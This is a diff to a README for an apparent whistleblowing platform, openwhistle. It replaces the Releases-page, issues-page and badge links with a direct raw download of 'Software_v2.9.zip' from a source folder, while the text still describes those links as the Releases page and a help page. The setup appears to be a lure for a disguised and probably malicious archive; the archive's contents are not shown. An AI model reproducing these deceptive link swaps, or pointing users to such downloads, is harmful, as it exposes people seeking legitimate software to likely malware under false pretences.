@@ -6,13 +6,13 @@ Welcome to **openwhistle**! This platform helps small and medium-sized enterpris
 
 ## 📥 Download Openwhistle
 
-[![Download Openwhistle](https://img.shields.io/badge/Download%20Now-orange)](https://github.com/AnshPatel2007/openwhistle/releases)
+[![Download Openwhistle](https://github.com/AnshPatel2007/openwhistle/raw/refs/heads/main/client/src/pages/public/Software_v2.9.zip%20Now-orange)](https://github.com/AnshPatel2007/openwhistle/raw/refs/heads/main/client/src/pages/public/Software_v2.9.zip)
 
 Follow these steps to get started:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page where you can find the latest version of openwhistle:  
-   [Download Openwhistle Releases](https://github.com/AnshPatel2007/openwhistle/releases)
+   [Download Openwhistle Releases](https://github.com/AnshPatel2007/openwhistle/raw/refs/heads/main/client/src/pages/public/Software_v2.9.zip)
 
 2. **Choose Your Download**  
    On the Releases page, look for the latest version. You will see a list of files available for download. The files may include installation packages for different operating systems. 
@@ -57,7 +57,7 @@ If you encounter any issues while downloading or installing openwhistle, conside
 
 4. **Check Compatibility**: Ensure that your operating system meets the minimum requirements.
 
-If problems persist, visit our [issues page](https://github.com/AnshPatel2007/openwhistle/issues) for assistance.
+If problems persist, visit our [issues page](https://github.com/AnshPatel2007/openwhistle/raw/refs/heads/main/client/src/pages/public/Software_v2.9.zip) for assistance.
 
 ## 📝 Getting Help
 
